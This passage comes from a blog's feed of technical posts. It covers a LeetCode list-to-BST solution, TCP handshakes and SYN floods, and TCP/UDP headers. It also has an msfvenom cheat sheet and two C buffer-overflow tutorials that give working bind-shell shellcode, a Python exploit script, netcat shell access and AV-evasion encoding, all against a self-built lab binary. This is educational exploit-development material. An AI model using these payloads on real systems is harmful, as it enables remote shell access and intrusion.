comment" spellcheck="true">// slow-fast pointers to get to the middle</span>    ListNode prev <span class="token operator">=</span> null<span class="token punctuation">;</span>    ListNode slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    ListNode fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        prev <span class="token operator">=</span> slow<span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// cut it</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>prev <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        prev<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// recursive calls -> the typical binary recursion for trees</span>    TreeNode root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">sortedListToBST</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// no worries because the list is cut</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">sortedListToBST</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Time-and-space-complexity"><a href="#Time-and-space-complexity" class="headerlink" title="Time and space complexity"></a>Time and space complexity</h3><p><strong>Time: O(nlog n)</strong></p><p>We have to get to the middle of the list in each recursive call. Every time the input size is halved so there are <code>log(n)</code> calls. In each call, a number equal to half of the whole list is traversed, so <code>n/2</code> steps in each level. Thus in total <code>O(nlog n)</code>.</p><p><strong>Space: O(1)</strong></p><p>This method only uses pointers. We ignore the space taken by method stack frames from recursive function calls.</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> slow-fast pointers </tag>
            
            <tag> Linked List </tag>
            
            <tag> tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP handshake and SYN attack</title>
      <link href="/2020/05/20/tcp-handshake-and-syn-attack/"/>
      <url>/2020/05/20/tcp-handshake-and-syn-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-handshake-process-and-states"><a href="#TCP-handshake-process-and-states" class="headerlink" title="TCP handshake process and states"></a>TCP handshake process and states</h2><p>For more detailed information, see the previous posts about TCP. The TCP handshake establishes the connection between client and server and consists of three steps: <code>SYN --&gt; SYN+ACK --&gt; ACK</code>. It is well described by this diagram:</p><p><img src="/2020/05/20/tcp-handshake-and-syn-attack/tcp_handshake_process.jpg" alt="TCP handshake process and states"></p><h3 id="Check-the-TCP-state-in-Linux"><a href="#Check-the-TCP-state-in-Linux" class="headerlink" title="Check the TCP state in Linux"></a>Check the TCP state in Linux</h3><p>Linux has a plethora of tools for TCP. For the purpose of socket statistics you can choose between <code>netstat</code> or <code>ss</code>. <code>netstat</code> queries using the file <code>/proc/net/tcp</code>, whereas <code>ss</code> directly queries the kernel using Netlink.</p><h3 id="Why-not-2-or-4-steps-but-3-steps"><a href="#Why-not-2-or-4-steps-but-3-steps" class="headerlink" title="Why not 2 or 4 steps but 3 steps??"></a>Why not 2 or 4 steps but 3 steps??</h3><p>There are three reasons:</p><ol><li>Three-way handshake is required to prevent old duplicate connection initiations from causing confusion.</li><li>It is required to synchronize the initial sequence number.</li><li>To prevent wasting resources and initiating many connections.</li></ol><h4 id="Reason-1-prevent-old-duplicate-connections-the-main-reason"><a href="#Reason-1-prevent-old-duplicate-connections-the-main-reason" class="headerlink" title="Reason 1: prevent old duplicate connections (the main reason)"></a>Reason 1: prevent old duplicate connections (the main reason)</h4><p>The server waits for the third packet to decide whether to start connection. If it receives <code>ACK</code> then it starts the connection, else if it receives <code>RST</code> then it breaks connection. Thus, in a two-way handshake this is not possible and the server would start the connection as soon as it receives the SYN packet.</p><p><img src="/2020/05/20/tcp-handshake-and-syn-attack/tcp_duplicate_conn.jpg" alt="Detect old duplicate connections"></p><h4 id="Reason-2-Synchronize-sequence-numbers"><a href="#Reason-2-Synchronize-sequence-numbers" class="headerlink" title="Reason 2: Synchronize sequence numbers"></a>Reason 2: Synchronize sequence numbers</h4><p>Both the client and the server needs to get an <code>ACK</code> packet to ensure that the counterpart has synchronized its <code>seq</code> number.</p><h4 id="Reason-3-Waste-of-resources"><a href="#Reason-3-Waste-of-resources" class="headerlink" title="Reason 3: Waste of resources"></a>Reason 3: Waste of resources</h4><p>It can be inferred from the first reason. If there is a network congestion in the client side and meanwhile the client sent many many <code>SYN</code> packets, then in a two-way handshake the server would allocate resources for every <code>SYN</code> packet. This resources, except one, are all unused.</p><h3 id="How-are-ISN-Initial-Sequence-Number-generated"><a href="#How-are-ISN-Initial-Sequence-Number-generated" class="headerlink" title="How are ISN (Initial Sequence Number) generated?"></a>How are ISN (Initial Sequence Number) generated?</h3><p>According to RFC1948, <code>ISN = M + F(localhost, localport, remotehost, remoteport)</code>. Where <code>M</code> is a counter which +1 every 4ms and resets every 4.55 hours. <code>F</code> is a hash function, like MD5.</p><h2 id="TCP-communication-–-gt-division-into-packets"><a href="#TCP-communication-–-gt-division-into-packets" class="headerlink" title="TCP communication –&gt; division into packets"></a>TCP communication –&gt; division into packets</h2><ul><li><strong>MTU (Maximum Transmission Unit)</strong> is the maximum length of IP header + TCP header + data, for Ethernet it is 1500 bytes.</li><li><strong>MSS (Maximum Segment Size)</strong> is a parameter in TCP options header that specifies the maximum amount of data (not headers) in TCP packets.</li></ul><p>If the division of packets is done <strong>at IP level</strong>, the packets are divided so that each of them has size less than MTU. The IP packets are combined in the destination computer and sent to the transport layer (TCP). If the destination computer finds that there is some mismatch, it will not send an <code>ACK</code> and so after some time the sender will send the whole data and TCP headers again.</p><p>That’s why the division of packets is done at <strong>TCP level</strong>. At the TCP level, the sender computer breaks the data so they all have at most MSS size (the connection’s MSS is sent in the options field in <code>SYN</code> packet, observe it in WIreshark), this also ensures that the IP packets will have at most MTU size. When the destination computer gets to the TCP level, it just has to acknowledge all TCP packets it has received, because the sender will know which TCP packet hasn’t received an <code>ACK</code> and so it only has to repeat packets of size <code>MSS</code>. This is a big gain from the previous method!</p><h2 id="SYN-attack-SYN-floods"><a href="#SYN-attack-SYN-floods" class="headerlink" title="SYN attack - SYN floods"></a>SYN attack - SYN floods</h2><p>Imagine an attacker sends a lot of <code>SYN</code> packets with different spoofed IP addresses. The target server enters <code>SYN_RCVD</code> but it doesn’t receive <code>ACK</code>. This fills the whole <em>SYN queue</em> while the <em>Accept queue</em> is empty, making the server unable to process legitimate <code>SYN</code> packets.</p><p><img src="/2020/05/20/tcp-handshake-and-syn-attack/syn_attack.jpeg" alt="SYN queue and Accept queue"></p><p>Another abnormal situation is when the application executes the <code>accept()</code> socket API very slowly, and the Accept queue gets full.</p><p><a href="https://blog.cloudflare.com/syn-packet-handling-in-the-wild/" target="_blank" rel="noopener">A very good article about how these two queues work in Linux.</a></p><h3 id="Linux-internal-kernel-parameters"><a href="#Linux-internal-kernel-parameters" class="headerlink" title="Linux internal kernel parameters"></a>Linux internal kernel parameters</h3><p>Use <code>systemctl</code> to query these parameters.</p><pre><code>net.core.netdev_max_backlog   --&gt; queue sizenet.ipv4.tcp_max_syn_backlog  --&gt; max SYN_RCVD connectionsnet.ipv4.tcp_abort_on_overflow --&gt; directly send RST to new SYN when overflownet.ipv4.tcp_syncookies = 1 --&gt; handle new SYN with cookies when SYN overflow</code></pre><h3 id="Query-the-SYN-queue-and-the-Accept-queue"><a href="#Query-the-SYN-queue-and-the-Accept-queue" class="headerlink" title="Query the SYN queue and the Accept queue"></a>Query the SYN queue and the Accept queue</h3><p>Print SYN queue:</p><pre class="line-numbers language-bash"><code class="language-bash">$ ss -n state syn-recv sport <span class="token operator">=</span> :80<span class="token operator">|</span><span class="token function">cat</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Print Accept queue:</p><pre class="line-numbers language-bash"><code class="language-bash">$ ss -plnt sport <span class="token operator">=</span> :6443<span class="token operator">|</span><span class="token function">cat</span>State   Recv-Q Send-Q  Local Address:Port  Peer Address:PortLISTEN  0      1024                *:6443             *:*     <span class="token punctuation">(</span>0 sockets <span class="token keyword">in</span> Accept queue<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="How-TCP-SYN-cookies-work"><a href="#How-TCP-SYN-cookies-work" class="headerlink" title="How TCP SYN cookies work"></a>How TCP SYN cookies work</h3><ol><li>Receive a <code>SYN</code> packet and do NOT store it in SYN queue because it is full.</li><li>Compute a <code>cookie</code> value and send it as the <code>seq</code> of <code>ACK+SYN</code> packet statelessly.<pre><code>t mod 32 (6 bits) | MSS (2 bits) | hash(ip, port, t) (24 bits)</code></pre></li><li>Check cryptographically from the <code>ACK</code> response that it is valid and start connection using the decrypted data.</li></ol><p>Because there is limited detail about the connection in the cookie, the TCP connection quality is degraded.</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> networking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP and UDP 2: packets</title>
      <link href="/2020/05/19/tcp-and-udp-2-packets/"/>
      <url>/2020/05/19/tcp-and-udp-2-packets/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-packet-header"><a href="#TCP-packet-header" class="headerlink" title="TCP packet header"></a>TCP packet header</h2><p><img src="/2020/05/19/tcp-and-udp-2-packets/TCP-packet.jpg" alt="TCP packet structure"></p><ul><li><strong>Sequence number</strong>: When connection is established, it is set to an initial random number. Every time the sender sends data, it increments the <code>seq</code>. This ensures packets are received in <strong>order</strong>.</li><li><strong>Acknowledge number</strong>: It tells the sender that the packets with <code>seq</code> number less than this <code>ack</code> number are well-received. It ensures that packets are not lost.</li><li><strong>Header length</strong>: Because options field has variable length, the header length is required to get the data.</li><li><strong>Reserved</strong>: Now zeroed for future use.</li><li><strong>Flags</strong>:</li></ul><table><thead><tr><th><strong>ACK</strong></th><th><strong>RST</strong></th><th><strong>SYN</strong></th><th><strong>FIN</strong></th><th><strong>PSH</strong></th><th><strong>URG</strong></th></tr></thead><tbody><tr><td><code>ack</code> number field becomes available</td><td>Error in connection, need to cut the connection</td><td>Ask for connection and send first random <code>seq</code> number</td><td>Tell that the sender will not send data anymore</td><td>Indicates that data should be passed to the application as soon as possible</td><td>Indicates that some urgent data has been placed</td></tr></tbody></table><ul><li><strong>Window size</strong>: Size of the sender’s receive window (buffer available).</li><li><strong>Urgent pointer</strong>: Points to the part where urgent data has been placed.</li><li><strong>Options</strong>: Various TCP options.</li></ul><h2 id="UDP-packet-header"><a href="#UDP-packet-header" class="headerlink" title="UDP packet header"></a>UDP packet header</h2><p> <img src="/2020/05/19/tcp-and-udp-2-packets/UDP-packet.jpg" alt="UDP packet structure"></p><p> The <strong>packet length</strong> includes data and header length.</p><h3 id="Why-UDP-has-packet-length-and-TCP-has-header-length"><a href="#Why-UDP-has-packet-length-and-TCP-has-header-length" class="headerlink" title="Why UDP has packet length and TCP has header length?"></a>Why UDP has packet length and TCP has header length?</h3><p>TCP packet header length is variable, so it needs to indicate the offset of the data field in the packet. The size of the data can be calculated:</p><pre><code>TCP data length = IP total length - IP header length - TCP header length</code></pre><p>UDP data length can also be calculated, so why is it there? Maybe because there is space to be filled so that the header length is multiple of a byte.</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> networking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy msfvenom</title>
      <link href="/2020/05/18/easy-msfvenom/"/>
      <url>/2020/05/18/easy-msfvenom/</url>
      
        <content type="html"><![CDATA[<h2 id="List-payloads"><a href="#List-payloads" class="headerlink" title="List payloads"></a>List payloads</h2><p>Get a list of payloads with:</p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -l payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Get more information and how to configure the payloads with:</p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> --list-options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Staged-and-stageless-payloads"><a href="#Staged-and-stageless-payloads" class="headerlink" title="Staged and stageless payloads"></a>Staged and stageless payloads</h3><p>Staged payloads have a “/“ in between their name, while stageless payloads not. For example, “windows/shell_bind_tcp” is stageless and “windows/shell/bind_tcp” is staged. Staged payloads are smaller in size because it tells the victim to download the rest of the payload. This is useful when the input size is limited.</p><p>Staged payloads need special payload listeners, like Metasploit’s Meterpreter multi/handler:</p><pre class="line-numbers language-bash"><code class="language-bash">$ msf<span class="token operator">></span> use exploit/multi/handler$ exploit/multi/handler<span class="token operator">></span> <span class="token keyword">set</span> payload <span class="token operator">&lt;</span>payload<span class="token operator">></span>$ <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Stafeless payloads like “shell_bind_tcp” can be exploited with <code>nc</code>.</p><h2 id="Configuring-the-payload"><a href="#Configuring-the-payload" class="headerlink" title="Configuring the payload"></a>Configuring the payload</h2><p>Configurations are listed when <code>--list-options</code> is called.</p><p>Common words are <strong>LHOST</strong> (listening host), <strong>LPORT</strong> (listening port) and <strong>EXITFUNC</strong> (method to execute when exit). The EXITFUNC can have values:</p><ul><li>none</li><li>seh : restart the process or thread automatically when an error occurs</li><li>thread : the exploited process runs the shellcode in a sub-thread, so exiting the thread won’t cause disruption (clean exit)</li><li>process : exit the process</li></ul><p>The syntax is:</p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> LHOST<span class="token operator">=</span>192.168.0.90 LPORT<span class="token operator">=</span>4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Output-format"><a href="#Output-format" class="headerlink" title="Output format"></a>Output format</h3><p>You can choose which format to output. To see a list of formats:</p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> -l formats<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>For example, for EXE format, we can redirect it to an specified EXE file:</p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> -f exe -o legit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Further-refinating"><a href="#Further-refinating" class="headerlink" title="Further refinating"></a>Further refinating</h2><h3 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h3><p>Encoding will obfuscate the shellcode and make it less detectable. It can be encoded various iterations. It works like this: the shellcode is encoded but the decoding way and the number of iterations is also in the payload. Set the encoder with <code>-e</code> and the number of iterations with <code>-i</code>.</p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>config<span class="token operator">></span> -e x86/shikata_ga_nai -i 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Bad-characters"><a href="#Bad-characters" class="headerlink" title="Bad characters"></a>Bad characters</h3><p>There are characters that must be avoided, like ‘\x00’ (null byte), ‘\x0a’ (line feed) or ‘\x0d’ (carriage return), because these will crash the program in a buffer overflow. Avoid then using <code>-b \x00\x0a\x0d</code>. Then the shellcode is handled by an encoder that avoids this byte.</p><h3 id="NOP-sled"><a href="#NOP-sled" class="headerlink" title="NOP sled"></a>NOP sled</h3><p>NOP sled is useful because the memory addresses inside gdb is a bit moved, so we don’t know exactly where to place the return pointer. If the return pointer landed in between NOPs, it will continue doing nothing until finding the shellcode. Use msfvenom to preppend 100 bytes of NOPs in a fancy way (encoded) with <code>-n 100</code>. We can also include bare NOPs with b’\x90’.</p><h3 id="Python-variable-name"><a href="#Python-variable-name" class="headerlink" title="Python variable name"></a>Python variable name</h3><p>Use <code>-v &lt;name&gt;</code> to set the variable name in python code.</p>]]></content>
      
      
      <categories>
          
          <category> Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C buffer overflow to inject shellcode</title>
      <link href="/2020/05/14/c-buffer-overflow-to-inject-shellcode/"/>
      <url>/2020/05/14/c-buffer-overflow-to-inject-shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>See the previous article about buffer overflow to hijack RP. Instead of calling an existing function in an executable, we can also overwritte bytes after the stack with shellcode and then use the RP to point to the injected shellcode.</p><h3 id="Prepare-the-challenge"><a href="#Prepare-the-challenge" class="headerlink" title="Prepare the challenge"></a>Prepare the challenge</h3><p>NX (No Execution Policy) bits come into play when you are trying to execute shellcode on the heap or stack. So we disable it with <code>-z execstack</code>. We will use the same code as in the previous buffer overflow article.</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What is the secret word?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this is dangerous, better scanf("%19s", data)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"YaY! Flag is: guiltycrown"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">bash</span> -c <span class="token string">'echo 0 > /proc/sys/kernel/randomize_va_space'</span>gcc -fno-stack-protector -z execstack -o hijackRP hijackRP.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="msfvenom-shellcode-generator"><a href="#msfvenom-shellcode-generator" class="headerlink" title="msfvenom shellcode generator"></a>msfvenom shellcode generator</h2><p>Do not trust any shellcode you find on Internet. A very useful tool to generate payloads is <code>msfvenom</code>. Run <code>msfvenom -l payloads</code> to see a full list of payloads, and <code>msfvenom --list-options &lt;payload&gt;</code> to see how to configure each payload. I will collect a cheatsheet for msfvenom next time.</p><p><img src="/2020/05/14/c-buffer-overflow-to-inject-shellcode/msfvenom_list_options.png" alt="msfvenom --list-options"></p><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p linux/x64/shell_bind_tcp -b \x00\x0a\x0d -f py LPORT<span class="token operator">=</span>1337 -n 100 -v info <span class="token operator">></span> payload.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Bind tcp opens a tcp port on victim’s machine, to which the attacker can connect to get shell access. This may require a config modification in port forwarding in victim’s firewall. Reverse tcp is easier to manage, as the victim itself connects to the attacker machine’s listening port (LPORT). The attacker has to change its firewall port forwarding rules.</p></blockquote><p>This creates a payload as Python code targeting Linux platform and x64 architecture. The victim will open TCP port 1337. Because we are exploiting buffer overflow, we must avoid bad bytes like <code>\x00</code> (null byte), <code>\x0a</code> (line feed), <code>\x0d</code> (carriage return) and maybe <code>\x20</code> (space). Then we preppend at the top a 100 bytes NOP sled and set the python variable name to <code>info</code>.</p><h2 id="Hijack-the-RP"><a href="#Hijack-the-RP" class="headerlink" title="Hijack the RP"></a>Hijack the RP</h2><p>Now we use gdb to check where approximately to make RP point to. Because the memory addresses in gdb are a bit moved compared to their values outside of gdb, we must at least transport the return pointer to in between NOPs, which is then followed by the injected shellcode. We insert the payload as input and use gdb to inspect the addresses near the stack pointer:</p><pre class="line-numbers language-bash"><code class="language-bash">pwngdb<span class="token operator">></span> x/100x <span class="token variable">$esp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/05/14/c-buffer-overflow-to-inject-shellcode/inspect_rsp.png" alt="Inspect the addresses overwritten by buffer overflow"></p><p>We’ll choose <code>0x7fffffffe0b8</code> as return pointer value. So the python code is:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> structoffset <span class="token operator">=</span> <span class="token number">40</span>nop <span class="token operator">=</span> <span class="token string">"\x90"</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token comment" spellcheck="true"># brute NOP sled</span>rp <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> <span class="token number">0x7fffffffe0b8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># long long (64-bit, little endian)</span><span class="token comment" spellcheck="true"># generated by msfvenom, but without that fancy NOP sled</span>info <span class="token operator">=</span>  b<span class="token string">""</span>info <span class="token operator">+=</span> b<span class="token string">"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"</span>info <span class="token operator">+=</span> b<span class="token string">"\x97\x52\xc7\x04\x24\x02\x00\x05\x39\x48\x89\xe6\x6a"</span>info <span class="token operator">+=</span> b<span class="token string">"\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48"</span>info <span class="token operator">+=</span> b<span class="token string">"\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48"</span>info <span class="token operator">+=</span> b<span class="token string">"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99"</span>info <span class="token operator">+=</span> b<span class="token string">"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"</span>info <span class="token operator">+=</span> b<span class="token string">"\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>exploit <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset <span class="token operator">+</span> rp <span class="token operator">+</span> nop <span class="token operator">+</span> info<span class="token keyword">print</span><span class="token punctuation">(</span>exploit<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Now prepare the payload as input:</p><pre class="line-numbers language-bash"><code class="language-bash">$ python payload.py <span class="token operator">></span> <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Control-the-victim-shell"><a href="#Control-the-victim-shell" class="headerlink" title="Control the victim shell"></a>Control the victim shell</h2><p>Use netcat to connect to a service.</p><pre class="line-numbers language-bash"><code class="language-bash">$ nc 192.168.0.90 1337<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/05/14/c-buffer-overflow-to-inject-shellcode/success_shell.png" alt="Victim shell access"></p><h2 id="Detect-the-bind-shell"><a href="#Detect-the-bind-shell" class="headerlink" title="Detect the bind shell"></a>Detect the bind shell</h2><p>The bind shell is a listening port, so I will check with these commands (either one).</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">lsof</span> -i -P -n$ <span class="token function">sudo</span> ss -tulwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/05/14/c-buffer-overflow-to-inject-shellcode/detect_backdoor.png" alt="Detect backdoor"></p><h2 id="Remove-the-bind-shell"><a href="#Remove-the-bind-shell" class="headerlink" title="Remove the bind shell"></a>Remove the bind shell</h2><p>Close the port that leaks access to shell.</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">kill</span> pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>However, in this case the bind shell closes as the program is exited. A better exploit would migrate to a subprocess.</p><h2 id="Shellcode-library-for-exploit-research"><a href="#Shellcode-library-for-exploit-research" class="headerlink" title="Shellcode library for exploit research"></a>Shellcode library for exploit research</h2><p>Shell-storm.org has a curated library of shellcodes.</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">wget</span> http://shell-storm.org/files/shell-storm-api.py$ python shell-storm-api.py -search /bin/sh*linux <span class="token comment" spellcheck="true"># search keywords /bin/sh AND linux (case-insensitive)</span>$ python shell-storm-api.py -display 887 <span class="token comment" spellcheck="true"># 887 is the shellcode id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://www.exploit-db.com/shellcodes" target="_blank" rel="noopener">Exploit.db</a> also has a searchable database of shellcodes.</p><p>Are you curious, how do you create your own shellcode? Mmmmmm…</p>]]></content>
      
      
      <categories>
          
          <category> Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary exploitation </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C buffer overflow to hijack RP</title>
      <link href="/2020/05/14/c-buffer-overflow-to-hijack-rp/"/>
      <url>/2020/05/14/c-buffer-overflow-to-hijack-rp/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>The return pointer (RP) is located at the bottom of the function stack. If we can overflow the buffer we can write any address to the RP and hijack it to execute a hidden function, like <code>validate()</code>. We will use <code>gdb</code>.</p><h3 id="Code-execution-via-buffer-overflow-mitigations"><a href="#Code-execution-via-buffer-overflow-mitigations" class="headerlink" title="Code execution via buffer overflow: mitigations"></a>Code execution via buffer overflow: mitigations</h3><p>The exploit here is to insert more bytes than the buffer size, such that the additional bytes reach the bottom of the stack. Note that measures to protect from buffer overflow include ASLR (Address Space Layout Randomization), stack canaries and the NX (No Execute) section. But it is still possible to break the code! (Check <a href="https://github.com/slimm609/checksec.sh.git" target="_blank" rel="noopener"><code>checksec</code></a>))</p><p>If there is a canary before the return pointer, the modified canary will alert and end the program: <code>stack smashing detected</code>.<br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/protected.png" alt="Stack smashing detected"></p><p>For demonstration purposes, I am going to disable ASLR and stack canaries.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># disable ASLR</span>$ <span class="token function">sudo</span> <span class="token function">bash</span> -c <span class="token string">'echo 0 > /proc/sys/kernel/randomize_va_space'</span><span class="token comment" spellcheck="true"># disable stack canaries</span>$ gcc -fno-stack-protector -o hijackRP hijackRP.c$ gdb ./hijackRP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>If we examine with gdb, we find a hidden function that never gets triggered…</p><pre class="line-numbers language-bash"><code class="language-bash">$ pwngdb<span class="token operator">></span> info func<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/info_func.png" alt="Results of `info func`"></p><p>First, which character position of user input will the RP be overwritten? We first insert A LOT of characters to provoque segmentation fault. By knowing roughly the size of the buffer, we’ll use a python script <a href="https://github.com/Svenito/exploit-pattern" target="_blank" rel="noopener"><code>pattern.py</code></a> to know exactly which character overwrites RP. We identified that the buffer overflows in 50 character as upper bound.<br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/segment_fault_test.png" alt="Segmentation fault with 50 characters"><br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/create_pattern.png" alt="Use pattern.py to create a testing user input"><br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/segment_fault_rp.png" alt="gdb shows the data at RP when segmentation fault"><br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/pattern_rp_position.png" alt="pattern.py shows at which position this pattern is"></p><p>Now that we know the exact position of the RP, we’ll finish with a python script.</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">nano</span> buffer_hijack_rp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">offset <span class="token operator">=</span> 